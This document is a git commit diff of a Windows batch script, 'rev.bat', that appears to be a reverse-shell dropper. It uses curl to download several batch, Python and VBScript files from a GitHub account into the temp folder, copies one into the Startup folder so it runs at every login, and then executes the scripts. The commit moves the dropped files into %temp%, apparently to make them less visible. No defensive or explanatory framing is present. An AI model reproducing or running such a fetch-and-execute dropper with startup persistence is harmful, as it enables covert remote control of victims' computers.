448d683fb99b374996525b10c863881f1997eff4
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-05 04:03:45 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -1,12 +1,12 @@
 @echo off
 set "downloads_dir=%USERPROFILE%\Downloads"
-curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat
+curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
 curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
-curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs
-curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
-curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%downloads_dir%\post.bat"
-curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%downloads_dir%\post.vbs"
-copy "%downloads_dir%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-start /wait D:\vb.vbs
-call "%downloads_dir%\vb1.vbs"
+curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o %temp%\vb.vbs
+curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%temp%\vb1.vbs"
+curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%temp%\post.bat"
+curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
+copy "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+start /wait %temp%\vb.vbs
+call "%temp%\vb1.vbs"
 exit
